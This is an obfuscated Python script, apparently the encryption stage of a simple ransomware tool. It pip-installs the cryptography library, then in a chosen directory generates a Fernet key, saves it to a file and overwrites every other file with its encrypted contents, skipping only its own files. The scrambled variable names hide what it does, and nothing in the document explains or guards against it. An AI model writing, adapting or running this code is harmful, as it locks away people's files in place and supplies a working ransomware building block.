import os as HsHHBEnmSSb
import sys as nMnnSbbWhkSJKF
import subprocess as bANnmSgHHWZIUfoo

bANnmSgHHWZIUfoo.check_call([nMnnSbbWhkSJKF.executable, '-m', 'pip', 'install', 'cryptography'])

from cryptography.fernet import Fernet as AjkLShhEBmSDw

kSjQUuSifp = []
llPsjJShQHHSuOF = ["encrypt.exe", "encrypt.py", "encrypt.key", "full_script.py"]

HsHHBEnmSSb.chdir("<path>") # <-- change path here

for NmAnnSjKFW in HsHHBEnmSSb.listdir():
    if NmAnnSjKFW in llPsjJShQHHSuOF:
        continue
    if HsHHBEnmSSb.path.isfile(NmAnnSjKFW):
        kSjQUuSifp.append(NmAnnSjKFW)

dhsjaKwJhSUUqOIShf = AjkLShhEBmSDw.generate_key()

with open("encrypt.key", "wb") as bmAbnMWvhjgshW:
    bmAbnMWvhjgshW.write(dhsjaKwJhSUUqOIShf)

for LskKjAbSBNSFm in kSjQUuSifp:
    if LskKjAbSBNSFm in llPsjJShQHHSuOF:
        continue
    with open(LskKjAbSBNSFm, "rb") as MNAnSBbWzzfzsiW:
        nABvsgQQvasJH = MNAnSBbWzzfzsiW.read()
    lskqHszzaWbvxbA = AjkLShhEBmSDw(dhsjaKwJhSUUqOIShf).encrypt(nABvsgQQvasJH)
    with open(LskKjAbSBNSFm, "wb") as AWVvsggSvQnmsnsdf:
        AWVvsggSvQnmsnsdf.write(lskqHszzaWbvxbA)